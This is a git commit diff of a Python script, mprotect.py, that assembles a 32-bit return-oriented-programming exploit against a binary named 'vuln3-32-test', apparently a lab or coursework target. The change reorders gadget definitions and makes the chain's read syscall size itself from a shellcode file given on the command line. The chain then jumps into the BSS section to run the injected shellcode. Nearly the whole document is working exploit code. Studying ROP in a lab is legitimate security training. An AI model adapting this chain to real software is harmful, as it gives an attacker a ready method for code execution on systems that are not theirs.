a12dc47c8e427ce141e499b0c0f1201034ec7578
Ruairi <roo2319@gmail.com>
2020-11-30 12:45:40 +0000

    Merged, Now can read the file size from command line

--- mprotect.py
+++ mprotect.py
@@ -2,30 +2,34 @@ from address_pop import doubadd
 import junk_length_and_addresses
 import address_pop
 from struct import pack
+import sys
+from os import stat
 import exploit_gadgets
 
 binary_name = "vuln3-32-test"
 
 rop = exploit_gadgets.ROPgadgets(binary_name)
 # Macro definitions for ROP Gadgets
-POPEDX    = pack('<I', rop.get_gadget("pop edx ; ret")) # pop edx ; ret
 POPEAX    = pack('<I', rop.get_gadget("pop eax ; ret")) # pop eax ; ret
+POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
+POPECXEBX = pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")) # pop ecx ; pop ebx ; ret
+POPEDX    = pack('<I', rop.get_gadget("pop edx ; ret")) # pop edx ; ret
+
 ADDEAXEDX = pack('<I', rop.get_gadget("add eax, edx ; ret")) # add eax, edx ; ret
 ADDECXECX = pack('<I', rop.get_gadget("add ecx, ecx ; ret"))
 ADDEAXECX = pack('<I', rop.get_gadget("add eax, ecx ; ret"))
 
-MOVISTACK = pack('<I', rop.get_gadget("mov dword ptr [edx], eax ; ret")) # mov dword ptr [edx], eax ; ret
 XOREAX    = pack('<I', rop.get_gadget("xor eax, eax ; ret")) # xor eax, eax ; ret
+
 INCEAX    = pack('<I', rop.get_gadget("inc eax ; ret")) # inc eax ; ret
 INCEBX    = pack('<I', rop.get_gadget("inc ebx ; ret")) # inc ebx ; ret
-
 INCECX    = pack('<I', rop.get_gadget("inc ecx ; ret")) # inc ecx ; ret
 INCEDX    = pack('<I', rop.get_gadget("inc edx ; ret")) # inc edx ; ret
+
 DECEDX    = pack('<I', rop.get_gadget("dec edx ; ret")) # dec edx ; ret
-INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
+
 NOP       = pack('<I', rop.get_gadget("nop ; ret")) # nop
-POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
-POPECXEBX = pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")) # pop ecx ; pop ebx ; ret
+INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
 
 
 def rop_exploit(base_address):
@@ -41,6 +45,7 @@ def rop_exploit(base_address):
     print(f"{bss:x}")
     exploit = b'\x41' * padding
 
+    shellcode_len = stat(sys.argv[1]).st_size
     
     exploit += address_pop.doubadd(0x0000007D,ADDECXECX,INCECX)
     exploit += XOREAX 
@@ -62,17 +67,16 @@ def rop_exploit(base_address):
     exploit += INCECX # One of the incs is consumed by EBX
     exploit += address_pop.pop_reg(0xffffffff,POPEBX,0,INCEBX,"inc")
     exploit += INCEBX #stdin
-    
-
     exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
+    exploit += INCEDX
     # Read 28 bytes
-    exploit += INCEDX * 29 
+    exploit += INCEDX * shellcode_len
+
     exploit += INT80
 
 
     # We must jump to an offset of BSS as BSS contains null characters
     exploit += pack('<I', bss + 4) 
-    exploit += b"A"*100
 
     return exploit
 
